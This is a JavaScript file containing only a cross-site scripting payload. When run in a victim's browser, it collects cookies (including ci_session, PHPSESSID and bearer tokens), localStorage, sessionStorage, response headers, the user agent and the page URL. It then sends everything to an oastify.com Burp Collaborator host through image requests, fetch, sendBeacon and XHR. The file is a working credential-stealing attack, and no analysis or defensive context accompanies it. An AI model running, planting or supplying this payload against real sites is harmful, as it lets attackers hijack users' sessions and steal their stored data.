(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  var cookies=document.cookie;
  var userAgent=navigator.userAgent;
  var allHeaders={};
  
  if(!cookies||cookies.length===0){
    var xhr=new XMLHttpRequest();
    xhr.open('HEAD',window.location.href,false);
    xhr.onreadystatechange=function(){
      if(xhr.readyState===4){
        var headerStr=xhr.getAllResponseHeaders();
        var headerPairs=headerStr.split('\r\n');
        for(var i=0;i<headerPairs.length;i++){
          var headerPair=headerPairs[i].split(': ');
          if(headerPair[0]){
            allHeaders[headerPair[0]]=headerPair[1];
          }
        }
      }
    };
    xhr.send();
  }
  
  var allCookies=document.cookie||'';
  var localStorageData=JSON.stringify(localStorage);
  var sessionStorageData=JSON.stringify(sessionStorage);
  
  var payload={
    ci_session:getCookieValue('ci_session'),
    bearer:getCookieValue('Authorization')||getCookieValue('bearer'),
    phpsessid:getCookieValue('PHPSESSID'),
    all_cookies:allCookies,
    localStorage:localStorageData,
    sessionStorage:sessionStorageData,
    userAgent:userAgent,
    url:window.location.href,
    timestamp:new Date().toISOString(),
    allHeaders:allHeaders
  };
  
  function getCookieValue(name){
    var value='';
    if(document.cookie.length>0){
      var start=document.cookie.indexOf(name+'=');
      if(start!==-1){
        start=start+name.length+1;
        var end=document.cookie.indexOf(';',start);
        if(end===-1){end=document.cookie.length;}
        value=decodeURIComponent(document.cookie.substring(start,end));
      }
    }
    return value;
  }
  
  var encoded=btoa(JSON.stringify(payload));
  new Image().src=burp+'?data='+encoded;
  
  fetch(burp,{method:'POST',mode:'no-cors',body:JSON.stringify(payload)}).catch(function(){});
  navigator.sendBeacon(burp,JSON.stringify(payload));
  
  try{
    var xhr2=new XMLHttpRequest();
    xhr2.open('POST',burp,true);
    xhr2.send(JSON.stringify(payload));
  }catch(e){}
})();
